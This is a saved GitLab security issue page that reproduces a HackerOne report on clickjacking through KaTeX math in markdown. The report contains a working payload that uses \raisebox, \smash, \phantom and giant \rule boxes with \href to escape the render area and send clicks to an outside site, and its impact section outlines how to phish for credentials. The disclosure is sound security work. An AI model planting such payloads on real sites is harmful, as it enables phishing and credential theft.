=== Content from gitlab.com_af8fd3fc_20250111_033229.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Math rendering in markdown can escape container and hijack clicks

# âš  Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.

**[HackerOne report #1887323](https://hackerone.com/reports/1887323)** by `ammar2` on 2023-02-25, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

KaTeX based math rendering in Markdown has various features for adjusting the positioning of math elements on screen. Some of these directives can be exploited to escape the usual markdown rendering container and create elements in unexpected parts of the page. This coupled with `\href{}` command allows an attacker to hijack some links and buttons on the GitLab UI.

##### Steps to reproduce

1. Go to any system that allows you to render markdown, editing a README, creating an issue etc.
2. Paste the following markdown code:

```
```math
\hskip{-200pt}
\href{http://ammaraskar.com}{
\smash{\raisebox{20em}{$
\smash{
  \raisebox{20em}{$\phantom{
    \underset{
      \underset{
        \underset{
          \rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}
        }{
          \rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}
        }
      }{
        \underset{
          \rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}
        }{
          \rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}
        }
      }
    }{
      \underset{
        \underset{
          \rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}
        }{
          \rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}
        }
      }{
        \underset{
          \rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}
        }{
          \rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}\rule{20em}{20em}
        }
      }
    }
  }
  $}
}
$}}
}
```
```

3. Clicking almost any UI element in the center panel will bring the user to an attacker controlled website.

##### Impact

See impact section at the end.

##### Examples

I have a reproducer on GitLab.com but the repo visibility is private to prevent anyone from discovering the exploit:

* <https://gitlab.com/ammaraskar/test-markdown>
* <https://gitlab.com/ammaraskar/test-markdown/-/issues/1>

Please let me know if I should add someone to the repo to help triage or if I should export the repo.

##### What is the current *bug* behavior?

Markdown renders outside the bounds of what a user would expect, allowing them to easily hijack clicks to GitLab UI elements.

##### What is the expected *correct* behavior?

All markdown rendering should be constrained to the expected area and not be able to affect other parts of the page.

##### Relevant logs and/or screenshots

I have attached a video demonstrating the click-jacking. There is also screenshots without the `\phantom` element demonstrating the elements rendered to the page.

##### Output of checks

This bug happens on GitLab.com

#### Impact

An attacker can exploit this attack on any README, a comment on a bug, or anywhere else markdown+math are rendered. A popular bug report's comment would be a good target.

Once a user loads the page, clicking on any UI elements will take them to an attacker controlled page. Here, the attacker can try to imitate the GitLab UI and try to phish for credentials. Unless a user is carefully looking at their URL bar, they might not notice they have been redirected to an attacker's website.

While the naive attack demonstrated above makes one big click-box, one can imagine a more convincing attack would be to place more targeted rectangles on each clickable area with the right target page.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Demo-On-Issue-Page.webm](https://h1.sec.gitlab.net/a/169e6c71-cdaf-440e-986e-bdd1554ff4d8/Demo-On-Issue-Page.webm)
* [Demo-On-README.webm](https://h1.sec.gitlab.net/a/da6295ec-f288-495e-8abf-bc4822950c89/Demo-On-README.webm)
* [ScreenshotWithBoxVisible.png](https://h1.sec.gitlab.net/a/afe4698a-8e0f-415f-8bad-d257b477c4f1/ScreenshotWithBoxVisible.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


